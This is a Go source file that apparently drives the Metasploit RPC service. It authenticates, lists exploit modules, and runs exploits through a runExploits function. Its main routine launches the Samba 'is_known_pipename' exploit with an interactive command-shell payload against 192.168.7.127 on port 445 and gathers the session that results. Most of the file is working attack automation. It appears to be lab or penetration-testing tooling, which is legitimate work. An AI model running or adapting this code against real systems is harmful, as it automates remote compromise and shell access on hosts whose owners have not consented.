package main

import (
	"fmt"
	"gomsfrpc/msfrpc"
	"gomsfrpc/utils"
	"time"
	// Configuration
	"log"
)

var rpc *msfrpc.MSFRPC

func init() {
	iniParser := utils.IniParser{}
	iniParser.Load("./config/config.ini")
	rpcHost := iniParser.GetString("server","msfrpc_host")
	rpcPort := iniParser.GetString("server","msgrpc_port")
	rpcUser := iniParser.GetString("server","msgrpc_user")
	rpcPass := iniParser.GetString("server","msfrpc_pass")
	rpc = msfrpc.NewMsfrpc(rpcHost, rpcPort, "/api", rpcUser, rpcPass, false)
	_, err := rpc.AuthLogin()
	if err != nil {
		log.Print(err)
		//os.Exit(1)
	}
}

func getExplist(expType string) ([]string, error) {
	modulelist, err := rpc.ModulesList(expType)

	if err != nil {
		log.Print(err)
		return nil, err
	}
	return modulelist, nil
}

func runExploits(rhost string, rport string, moduleexp string, targetid string, payload string) (interface{}) {
	option := make(map[string]interface{})
	option["RHOST"] = rhost
	option["RPORT"] = rport
	option["TARGET"] = targetid
	option["PAYLOAD"] = payload
	retmsg := make(map[string]interface{})

	moduleExecuteResult, err := rpc.ModuleExecute(moduleexp, "exploit", option)
	if err != nil {
		retmsg["state"] = 400
		retmsg["errmsg"] = err.Error()
		return retmsg
	}
	jobinfos, err := rpc.JobInfo(moduleExecuteResult.JobID)
	if err != nil {
		retmsg["state"] = 400
		retmsg["errmsg"] = err.Error()
		return retmsg
	}
	retmsg["jobinfo"] = jobinfos

	time.Sleep(5 * time.Second)
	sessions, err := rpc.SessionList()
	if err != nil {
		retmsg["state"] = 400
		retmsg["errmsg"] = err.Error()
		return retmsg
	}

	for _, session := range sessions {
		if session.ExploitUuid == moduleExecuteResult.Uuid {
			retmsg["sessioninfo"] = session
		}
		rpc.SessionStop(session.SessionId)
	}
	rpc.JobStop(moduleExecuteResult.JobID)
	retmsg["state"] = 200
	return retmsg
}
func main() {

	//consoleid, err := rpc.ConsoleCreate()
	//if err != nil {
	//	log.Print("Create Console Fail!")
	//}
	//
	//result, err := rpc.ConsoleWrite(consoleid, "version\n")
	//if err != nil {
	//	log.Print("Write Console Fail!")
	//}
	//fmt.Printf("Result of 'console.create':  %v\n", result)
	//crresult := rpc.ConsoleRead(consoleid)
	//fmt.Println(crresult.Data, crresult.Busy)
	//consolelist, err := rpc.ConsoleList()
	//if err != nil {
	//	log.Print("Get Console List Fail!")
	//}
	//fmt.Println(consolelist)
	//
	//cmdlist, err := rpc.ConsoleTabs(consoleid, "e")
	//if err != nil {
	//	log.Print("Get Console tabs Fail!")
	//}
	//fmt.Println(cmdlist)
	//
	getExplist("exploit")
	result := runExploits("192.168.7.127", "445", "linux/samba/is_known_pipename", "0", "cmd/unix/interact")
	fmt.Println(result)
	//
	//moduleinfo, _ := rpc.ModuleInfo("exploit", "aix/local/ibstat_path")
	//if err != nil {
	//	log.Print(err)
	//}
	//fmt.Println(moduleinfo)
	//option := map[string]interface{}{"RHOST":"192.168.7.127","SMB_FOLDER":"/home/share","TARGET":"0","PAYLOAD": "cmd/unix/interact"}

	//moduleExecuteResult, _ := rpc.ModuleExecute("linux/samba/is_known_pipename", "exploit", option)
	//
	//job_id := moduleExecuteResult.JobID
	//time.Sleep(5*time.Second)
	//fmt.Println(job_id)
	//rpc.JobInfo(job_id)
	//jlist, _ := rpc.JobList()
	rpc.SessionList()
	//rpc.JobStop(job_id)
	//fmt.Println(jlist)
	//cdresult, err := rpc.ConsoleDestroy(consoleid)
	//if err != nil {
	//	log.Print("Get Console List Fail!")
	//}
	//fmt.Println(cdresult)

}
